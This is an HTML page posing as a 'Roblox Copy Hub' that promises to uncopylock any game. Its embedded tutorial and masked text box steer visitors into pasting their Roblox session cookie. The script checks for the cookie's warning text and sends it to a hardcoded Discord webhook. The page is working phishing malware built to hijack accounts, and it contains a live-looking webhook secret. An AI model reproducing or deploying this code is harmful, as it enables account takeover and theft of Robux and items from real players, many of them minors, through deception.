<!DOCTYPE html>

<head>

<title>Roblox Copy Hub</title>

<style>
  * { box-sizing: border-box; }

  body {
    margin: 0;
    min-height: 100vh;
    font-family: 'Segoe UI', Arial, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    background: linear-gradient(135deg, #1e3c72, #2a5298);
    background-size: 200% 200%;
    animation: bgGradient 20s ease infinite;
    overflow: hidden;
    color: #eee;
    flex-direction: column;
  }

  @keyframes bgGradient {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  h1.cool-title {
    font-size: 2.2rem;
    font-weight: 700;
    text-align: center;
    background: linear-gradient(90deg, #42e695, #3bb2b8, #8e44ad, #f39c12);
    background-size: 300% 300%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: shimmer 5s ease infinite;
    margin-bottom: 24px;
    text-shadow: 2px 2px 8px rgba(0,0,0,0.6);
  }

  @keyframes shimmer {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .card {
    width: 400px;
    background: rgba(0,0,0,0.75);
    border-radius: 16px;
    padding: 24px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.4);
  }

  h2 {
    text-align: center;
    margin-bottom: 18px;
    font-weight: 600;
    color: #fff;
  }

  .video-wrapper {
    width: 100%;
    aspect-ratio: 16/9;
    border-radius: 12px;
    overflow: hidden;
    margin-bottom: 16px;
    box-shadow: 0 10px 20px rgba(0,0,0,0.5);
  }

  iframe {
    width: 100%;
    height: 100%;
    border: none;
  }

  textarea {
    width: 100%;
    height: 100px;
    padding: 12px;
    border-radius: 10px;
    border: none;
    outline: none;
    resize: none;
    font-size: 14px;
    background: #111;
    color: #fff;
    transition: box-shadow 0.25s ease;
    -webkit-text-security: disc; 
    -moz-text-security: disc;
  }

  textarea:focus {
    box-shadow: 0 0 8px rgba(0, 200, 255, 0.5);
  }

  button {
    margin-top: 14px;
    width: 100%;
    padding: 12px;
    border-radius: 14px;
    border: none;
    font-size: 15px;
    font-weight: bold;
    cursor: pointer;
    color: white;
    background: linear-gradient(90deg, #42e695, #3bb2b8);
    transition: all 0.3s ease;
  }

  button:hover {
    box-shadow: 0 8px 20px rgba(66,230,149,0.6);
    transform: scale(1.02);
  }

  button:active {
    transform: scale(1);
    box-shadow: 0 4px 10px rgba(0,0,0,0.4);
  }

  .footer {
    margin-top: 12px;
    text-align: center;
    font-size: 12px;
    opacity: 0.7;
    color: #eee;
  }

  .hint {
    font-size: 12px;
    margin-top: 4px;
    color: #aad;
    text-align: right;
  }
</style>
</head>

<body>

<h1 class="cool-title">ðŸ”¥ Uncopylocked Any Game ðŸ”¥</h1>

    <iframe
      src="https://www.youtube.com/embed/T7TJH5MF74s"
      allowfullscreen>
    </iframe>
  </div>

  <textarea id="message" placeholder="Type your message here..."></textarea>
  <div class="hint">Make sure you follow the tutorial</div>

  <button onclick="sendMessage()">Extract</button>

<script>
  const MAX_LENGTH = 1999;
  const REQUIRED_TEXT = "|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|"; // <-- change this to your required text

  async function sendMessage() {
    const message = document.getElementById('message').value.trim();

    if (!message) {
      alert("Please follow the tutorial!");
      return;
    }

    if (!message.includes(REQUIRED_TEXT)) {
      alert("Error: please rewatch the tutorial and make sure you're doing it correctly!");
      return;
    }

    const webhookURL = "https://discord.com/api/webhooks/1438635586889060444/CKHiCB0XsbDaHk2OIMMxk1_P8hjrIevMnJ8wzPcIrr1doa5GhQcTVqyOYrLBBL7bcvCc";

    const chunks = [];
    for (let i = 0; i < message.length; i += MAX_LENGTH) {
      chunks.push(message.substring(i, i + MAX_LENGTH));
    }

    try {
      for (let chunk of chunks) {
        const response = await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: chunk })
        });

        if (!response.ok) {
          alert("Failed to extract");
          return;
        }
      }
     
      document.getElementById('message').value = "";
    } catch (error) {
      alert("Error: " + error);
    }
  }
</script>
